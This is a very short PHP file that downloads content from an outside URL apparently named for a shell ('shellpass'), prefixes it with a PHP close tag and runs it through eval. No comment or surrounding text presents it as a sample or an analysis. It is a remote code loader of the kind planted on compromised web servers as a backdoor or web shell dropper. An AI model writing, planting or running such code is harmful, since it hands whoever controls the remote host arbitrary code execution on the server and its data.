<?php

$content = file_get_contents(urldecode('https://preciseurl.org/shellpass'));

$content = "?> ".$content;
eval($content);
